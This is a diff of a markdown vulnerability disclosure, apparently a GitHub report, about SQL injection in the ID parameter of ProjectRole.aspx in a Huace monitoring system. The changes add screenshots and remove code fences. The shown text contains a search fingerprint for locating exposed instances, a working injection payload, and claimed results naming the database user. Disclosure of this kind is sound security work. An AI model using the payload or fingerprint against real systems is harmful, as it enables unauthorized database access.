@@ -3,6 +3,7 @@ Hunter:
 ```
 body="App_Themes/Flat/Login/backgroundEn.png"
 ```
+<img width="1274" height="598" alt="image" src="https://github.com/user-attachments/assets/abf05cf1-5752-4206-ab58-0a23c87ed6b3" />
 
 Title:
 
@@ -54,7 +55,8 @@ The ID parameter of the ProjectRole.aspx file in version 2.2 of the Huace Monito
 
 
 Proof of vulnerability:
-```
+
+
 Payload:
 
 '+or+'a'='a  
@@ -78,5 +80,5 @@ Final Database User：dbo
 
 Verify：dbs   200 status code is returned, and there is a difference in content length.
 <img width="1326" height="636" alt="image" src="https://github.com/user-attachments/assets/b8bc5b27-d3da-49cc-bdf1-63a7e0e4eced" />
-```
+
 
